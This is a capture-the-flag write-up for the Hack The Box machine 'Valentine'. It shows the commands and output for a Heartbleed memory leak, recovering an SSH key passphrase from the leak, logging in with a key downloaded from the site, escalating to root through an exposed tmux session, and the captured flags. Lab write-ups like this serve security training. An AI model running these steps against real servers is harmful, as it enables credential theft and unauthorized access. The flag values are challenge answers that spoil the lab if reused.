# HTB: Valentine
- Date Completed: August 11, 2025
- Difficulty: Easy (Retired)
- Methodology: Nmap vuln scan → Heartbleed exploitation → credential harvesting → SSH login with RSA key → privilege escalation via root-owned tmux session

#RECON

Nmap TCP top ports scan:

kali@kali:~/HTB/Machines/V4l3n71n3/TCP-Scan$ sudo nmap -sS --top-ports 1000 10.129.148.201

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap vuln scan on port 443:

kali@kali:~/HTB/Machines/V4l3n71n3/TCP-Scan$ sudo nmap -p 443 --script vuln 10.129.148.201

| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.

Port 443 is vulnerable to CVE-2014-0160 (Heartbleed).

Heartbleed exploitation:

kali@kali:~/HTB/Machines/V4l3n71n3$ python2 heartbleed.py 10.129.148.201 -p 443                   

Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 885
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D E0  mV0aGVoeXBlCg==.
  0160: DC 45 26 95 82 D2 C6 EC 83 26 13 7C 32 F6 33 26  .E&......&.|2.3&

WARNING: server returned more data than it should - server is vulnerable!

The script returned a memory dump containing a base64 string:

Decoding the string:

kali@kali:~/HTB/Machines/V4l3n71n3$ base64 -d encoded-pw.txt                                        
heartbleedbelievethehype

This appears to be an SSH key passphrase.

Web enumeration with Feroxbuster:

kali@kali:~/HTB/Machines/V4l3n71n3$ feroxbuster -w /usr/share/wordlists/dirb/common-php.txt -u http://10.129.148.201/

200      GET        2l     1794w     5383c http://10.129.148.201/dev/hype_key

Download and decode key:

kali@kali:~/HTB/Machines/V4l3n71n3$ curl http://10.129.148.201/dev/hype_key -s | xxd -r -p > hype_key 
Give the rsa key proper permissions:

kali@kali:~/HTB/Machines/V4l3n71n3$ chmod 600 hype_key                                              

#FOOTHOLD

SSH access as hype:

kali@kali:~/HTB/Machines/V4l3n71n3$ ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa -i hype_key hype@10.129.148.201                                                                
Enter passphrase for key 'hype_key': heartbleedbelievethehype

hype@Valentine:~$

Retrieve user.txt:

hype@Valentine:~$ cat user.txt
f01c6ee39f6c677deec799a18d8f634d

#PRIVESC

Check bash history:

hype@Valentine:~$ history

Found:

12  tmux -S /.devs/dev_sess 

Attach to the tmux session:

hype@Valentine:~$ tmux -S /.devs/dev_sess

Verify root:

root@Valentine:/home/hype# whoami
root

Retrieve root.txt:

root@Valentine:/home/hype# cat /root/root.txt
b75afd51d5385e30299462805af7d6cd

#FLAGS

user.txt : f01c6ee39f6c677deec799a18d8f634d
root.txt : b75afd51d5385e30299462805af7d6cd

#SUMMARY

Port 443 was running a vulnerable version of OpenSSL affected by Heartbleed (CVE-2014-0160). Exploiting it leaked a base64-encoded SSH key passphrase. Enumeration of the HTTP service revealed an RSA private key in /dev/hype_key. Using the passphrase and the key, SSH access was obtained as the hype user. Bash history revealed a root-owned tmux session, which provided immediate root access upon attaching.
